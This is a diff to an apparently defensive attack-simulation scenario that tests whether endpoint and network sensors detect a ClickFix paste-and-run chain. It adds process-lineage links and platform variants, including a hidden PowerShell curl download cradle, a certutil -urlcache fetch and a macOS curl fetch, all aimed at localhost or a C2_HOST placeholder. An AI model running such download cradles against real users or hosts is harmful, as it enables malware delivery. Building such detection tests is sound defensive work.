@@ -81,6 +81,16 @@ success_criteria: |
   to alert is within the MTTD budget.
 moat_tier: "LEAD"
 
+# ── Causality Group Owner anchor ────────────────────────────────────────────
+# The ClickFix chain is OWNED by explorer.exe — the Windows Run-dialog handler
+# that executes the human's Win+R paste. It is the initial-access process the
+# whole user-execution chain descends from (the interpreter is explorer-parented
+# with no browser/console ancestry — the durable tell), NOT the synthetic beacon.
+# primary_username is the interactive desktop user whose session ran the paste.
+cgo_anchor:
+  image_name: "explorer.exe"
+  primary_username: "user"
+
 external_tools: []
 
 # ── Steps ───────────────────────────────────────────────────────────────────
@@ -90,6 +100,9 @@ steps:
     command: "mkdir -p \"${MARKER_DIR:-/tmp/cortexsim-edr-016}\"; printf '%s\\n' 'CortexSim SAFE-MODE marker SIM-EDR-016 RunMRU value: powershell -w hidden -c curl.exe http://127.0.0.1/update.bin -o %TEMP%/a.bin' > \"${MARKER_DIR:-/tmp/cortexsim-edr-016}/runmru.marker\"; echo cortexsim-edr-016-runmru-paste-cradle-seeded"
     identity: www-data
     mitre_technique: "T1204.004"
+    # Root step — links from the explorer.exe CGO. RunMRU is a Windows-only
+    # Run-dialog artifact, so no cross-OS variant applies here.
+    platforms: ["windows"]
     expected_detections:
       - plane: EDR
         type: ABIOC
@@ -107,6 +120,15 @@ steps:
     command: "bash -c 'whoami; hostname; id' 2>&1 | head -5; echo cortexsim-edr-016-explorer-parented-interpreter-remote-fetch-args"
     identity: www-data
     mitre_technique: "T1059.001"
+    # The paste-launched interpreter descends directly from the explorer.exe
+    # Run-dialog handler (step-01's paste) — a real process-create fork.
+    causality:
+      parent_step: step-01
+      pivot: process_lineage
+    platforms: ["windows", "macos"]
+    platform_variants:
+      windows: "powershell.exe -w hidden -c \"curl.exe http://127.0.0.1/update.bin -o $env:TEMP\\a.bin\""
+      macos: "zsh -c \"curl -s http://127.0.0.1/update.bin -o /tmp/a.bin\""
     expected_detections:
       - plane: EDR
         type: ABIOC
@@ -124,6 +146,15 @@ steps:
     command: "curl -s --max-time 5 \"http://${C2_HOST:-127.0.0.1}/update.bin\" -o \"${MARKER_DIR:-/tmp/cortexsim-edr-016}/a.bin\" 2>/dev/null || true; echo cortexsim-edr-016-lolbin-remote-fetch-complete"
     identity: www-data
     mitre_technique: "T1105"
+    # The LOLBin downloader is forked by the paste-launched interpreter
+    # (step-02) — same-host process-create, so the pivot is process_lineage.
+    causality:
+      parent_step: step-02
+      pivot: process_lineage
+    platforms: ["windows", "macos"]
+    platform_variants:
+      windows: "certutil.exe -urlcache -split -f http://127.0.0.1/update.bin %TEMP%\\a.bin"
+      macos: "curl -s http://127.0.0.1/update.bin -o /tmp/a.bin"
     expected_detections:
       - plane: EDR
         type: ABIOC
@@ -146,6 +177,13 @@ steps:
     command: "echo '[SIM-EDR-016] Stitch verification — one incident_id spanning EDR + NDR'; echo '[*] Expected: CR-EDR-0016 fuses RunMRU cradle ABIOC + explorer-parented interpreter ABIOC + LOLBin-fetch ABIOC + NGFW payload egress into one user-execution incident anchored to the explorer.exe process instance'; echo cortexsim-edr-016-cr-edr-0016-stitched-clickfix-incident"
     identity: www-data
     mitre_technique: "T1204.004"
+    # Terminal stitch — joins the endpoint ABIOC lineage (steps 01-03) to the
+    # NGFW payload egress: endpoint-signal <-> firewall-session, so the pivot
+    # is endpoint_network_stitch.
+    causality:
+      parent_step: step-03
+      pivot: endpoint_network_stitch
+    platforms: ["windows"]
     expected_detections:
       - plane: ANALYTICS
         type: Correlation
